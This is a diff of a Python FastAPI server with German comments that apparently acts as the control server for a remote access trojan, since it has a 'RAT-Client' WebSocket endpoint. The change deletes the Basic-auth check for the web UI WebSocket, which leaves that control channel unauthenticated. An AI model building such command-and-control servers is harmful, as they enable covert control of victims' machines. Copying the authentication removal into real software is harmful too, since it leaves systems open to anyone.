@@ -46,48 +46,18 @@ async def get_current_user(credentials: HTTPBasicCredentials = Depends(security)
     return credentials.username
 
 
-# --- AUTH-FUNKTION FÜR WEB-UI WEBSOCKETS ---
-async def get_current_user_ws(websocket: WebSocket):
-    auth_header = websocket.headers.get("authorization")
-    if not auth_header:
-        await websocket.close(code=status.WS_1008_POLICY_VIOLATION)
-        raise WebSocketDisconnect("Authorization header fehlt")
-
-    try:
-        scheme, credentials_b64 = auth_header.split()
-        if scheme.lower() != "basic":
-            await websocket.close(code=status.WS_1008_POLICY_VIOLATION)
-            raise WebSocketDisconnect("Ungültiges Authentifizierungsschema")
-
-        decoded_credentials = base64.b64decode(credentials_b64).decode("utf-8")
-        username, password = decoded_credentials.split(":", 1)
-
-        correct_username = secrets.compare_digest(username, ADMIN_USERNAME)
-        correct_password = secrets.compare_digest(password, ADMIN_PASSWORD)
-
-        if not (correct_username and correct_password):
-            await websocket.close(code=status.WS_1008_POLICY_VIOLATION)
-            raise WebSocketDisconnect("Falsche Anmeldeinformationen")
-
-    except Exception:
-        await websocket.close(code=status.WS_1008_POLICY_VIOLATION)
-        raise WebSocketDisconnect("Fehler bei der Authentifizierung")
-
-    return username
-
-
 # --- Web-UI Endpunkte ---
 @app.get("/", dependencies=[Depends(get_current_user)])
 async def get_index():
     return FileResponse("index.html")
 
 
-@app.websocket("/ws", dependencies=[Depends(get_current_user_ws)])
+@app.websocket("/ws")
 async def websocket_endpoint(websocket: WebSocket):
     global WEB_UI_SOCKET
     await websocket.accept()
     WEB_UI_SOCKET = websocket
-    print("Web-UI verbunden und authentifiziert.")
+    print("Web-UI verbunden.")
     
     await send_to_web_ui(
         {
@@ -129,7 +99,7 @@ async def websocket_endpoint(websocket: WebSocket):
         WEB_UI_SOCKET = None
 
 
-# --- RAT-Client WebSocket Endpunkt (NEU) ---
+# --- RAT-Client WebSocket Endpunkt ---
 @app.websocket("/rat")
 async def rat_client_endpoint(websocket: WebSocket):
     global CLIENT_COUNTER
